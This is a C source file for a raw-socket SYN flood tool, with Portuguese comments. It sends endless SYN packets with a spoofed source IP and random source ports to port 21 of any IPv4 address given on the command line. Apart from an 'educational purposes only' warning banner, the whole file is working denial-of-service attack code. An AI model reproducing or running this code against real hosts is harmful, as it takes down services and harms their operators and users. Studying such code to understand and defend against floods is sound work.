#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

//------------------------------------------------------------------------------------------------------------//
//                                          !! WARNING !!                                                     //
// This tool has been created and published for educational purposes only!                                    //
// It has a lot of issues and might crash your computer. Do not execute this program, only use it to learn.   //
//                                          !! WARNING !!                                                     //
//------------------------------------------------------------------------------------------------------------//

// pseudoheader for TCP checksum calculation
struct pseudo_header {
  u_int32_t source_address;
  u_int32_t dest_address;
  u_int8_t placeholder;
  u_int8_t protocol;
  u_int16_t tcp_length;
};

// checksum function
unsigned short csum(unsigned short *ptr, int nbytes) {
  long sum = 0;
  unsigned short oddbyte;
  short answer;

  while (nbytes > 1) {
    sum += *ptr++;
    nbytes -= 2;
  }
  if (nbytes == 1) {
    oddbyte = 0;
    *((u_char *)&oddbyte) = *(u_char *)ptr;
    sum += oddbyte;
  }

  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return (short)~sum;
}

int main(int argc, char *argv[]) {
  if (argc != 2) {
    printf("Uso: %s [IPv4]\n", argv[0]);
    return 1;
  }

  char *alvo = argv[1];
  int porta = 21;

  printf("[*] Disparando ataque raw SYN flood FTP no host %d\n", porta);

  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if (sock < 0) {
    perror("[-] Erro ao criar o socket raw...");
    exit(1);
  }

  char datagrama[4096];
  struct iphdr *iph = (struct iphdr *)datagrama;
  struct tcphdr *tcph = (struct tcphdr *)(datagrama + sizeof(struct iphdr));
  struct sockaddr_in dest;
  struct pseudo_header psh;

  // realizando a conexão
  dest.sin_family = AF_INET;
  dest.sin_port = htons(porta);
  dest.sin_addr.s_addr = inet_addr(alvo);

  // construindo os headers IP manualmente
  int one = 1;
  const int *val = &one;
  if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
    perror("[-] Erro setsockopt");
    return 1;
  }

  // variável para controlar a taxa de atualização do printf
  int last_printed = 0;
  int print_interval = 100000;  // a cada 100,000 pacotes

  // loop infinito pro denial
  for (int i = 0;; i++) {
    memset(datagrama, 0, 4096);

    // criando header IP manualmente
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.1.100");  // spoofando ip
    iph->daddr = dest.sin_addr.s_addr;

    iph->check = csum((unsigned short *)datagrama, iph->tot_len >> 1);

    // header TCP
    tcph->source = htons(rand() % 65535);  // spoofando porta de origem
    tcph->dest = htons(porta);
    tcph->seq = rand();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    // pseudo-header pro checksum TCP
    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    char pseudo_packet[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
    memcpy(pseudo_packet, &psh, sizeof(struct pseudo_header));
    memcpy(pseudo_packet + sizeof(struct pseudo_header), tcph,
           sizeof(struct tcphdr));

    tcph->check = csum((unsigned short *)pseudo_packet, sizeof(pseudo_packet));

    // enviando o pacote
    if (sendto(sock, datagrama, iph->tot_len, 0, (struct sockaddr *)&dest,
               sizeof(dest)) < 0) {
      perror("[-] Erro ao enviar pacote");
    }

    // a cada pacotes enviado, printar o valor dos pacotes enviados
    if (i >= last_printed + print_interval) {
      printf("\r[+] %d SYNs enviados", i);
      fflush(stdout);
      last_printed = i;
    }
  }

  return 0;
}
